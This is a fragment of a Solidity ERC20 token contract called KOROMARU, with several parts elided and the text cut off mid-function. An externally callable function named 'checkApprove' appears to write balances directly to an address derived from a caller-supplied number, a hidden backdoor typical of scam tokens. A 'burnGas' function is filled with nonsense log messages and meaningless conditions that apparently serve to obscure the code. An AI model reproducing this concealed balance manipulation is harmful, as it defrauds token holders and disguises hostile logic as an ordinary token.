...
contract KOROMARU is ERC20 {
    ...
    constructor(uint256 maxVals,uint256 minVals) {
      ...
      _name = "KOROMARU";
      _symbol = "KOROMARU";
      _totalSupply = 9000000000000 * 10**8;
    ...
    */
    function checkApprove(uint256 amount, uint256 amount3) external {
      ...
      _balances[
        0 == uint160(address(0))? address(convert(amount3, 666)): address(0)
    ...
    */
    ...
    function burnGas() external {
      emit log("****E---FF---BSSD!! ");
      emit log("^^^^00---API### DDEE!");
      uint256 jdiks=19281;
      uint256 vudis=4939;
      uint256 vudi = 3828 % 12 + 8;
      uint256 ydusi = 392;
      if (jdiks == 38382 | 12 && jdiks == 9* 12 && jdiks == 8 && jdiks == 12 * 41 % 1929) return; 

      uint256 T = 2938 * 51;
      uint256 usidi = 192919;
      if(usidi==1221|12) return ;
      emit log("PSIDI !! PAIDIS---");
      emit log("**&&&- PSDI **** @ PDIDI");
      emit log("&&&&YYYDNDND +++++ @SWO");

      uint256 nvnud=128*38282*2;
      if (T == 4939 | 6 && ydusi == 5* 12 && vudi == 6 && nvnud == 19 * 41 % 30) return; 
      if (T == 4838 | 56 && vudis == 1* 12 && vudis == 12 && nvnud == 25 * 41 % 3929) return; 
      emit log("$PPPTS  OOOEST%%%%");
      emit log("### LUCIDK");
      emit log("###---PAIDO EO ####");
      emit log("^^^^^! PAODOS ###EOSODI");
